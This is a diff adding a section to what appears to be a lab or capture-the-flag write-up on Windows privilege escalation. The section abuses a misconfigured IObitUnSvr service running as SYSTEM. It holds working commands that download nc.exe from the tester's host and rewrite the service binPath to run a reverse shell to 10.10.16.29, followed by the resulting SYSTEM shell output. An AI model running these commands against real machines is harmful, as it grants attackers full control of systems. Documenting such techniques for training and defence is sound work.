@@ -111,3 +111,56 @@ Start-Service GammaService
 net user
 hacker
 ```
+
+---
+## Modifying Binary Path of Service
+
+Let's check if it runs as SYSTEM Process, so we can use it to elevate our privs.
+
+```
+sc.exe qc IObitUnSvr
+```
+
+Yes it does!
+
+Let's proceed with transfering nc.exe onto the target system.
+
+```
+iwr -uri http://10.10.16.29/nc.exe -o nc.exe
+```
+
+Started up listener on local machine.
+
+```
+rlwrap nc -lvnp 88
+```
+
+I will utilize the following command to reconfigure the service to execute an reverse connection to my local machine using nc.exe instead of its original platform, since I don't have write permissions.
+
+```
+sc.exe config IObitUnSvr binPath="cmd.exe /c C:\Temp\nc.exe 10.10.16.29 88 -e cmd.exe"
+```
+
+Reassured that the binarypath changed, it did!
+
+```
+sc.exe qc IObitUnSvr
+```
+
+We now just need to start the service and it should execute an reverse connection to our local machine as SYSTEM!
+
+```
+sc.exe start IObitUnSvr
+```
+
+Gained RCE as SYSTEM.
+
+```
+rlwrap nc -lvnp 88
+listening on [any] 88 ...
+connect to [10.10.16.29] from (UNKNOWN) [10.10.110.3] 56439
+Microsoft Windows [Version 10.0.18363.1256]
+(c) 2019 Microsoft Corporation. All rights reserved.
+
+C:\WINDOWS\system32>
+```
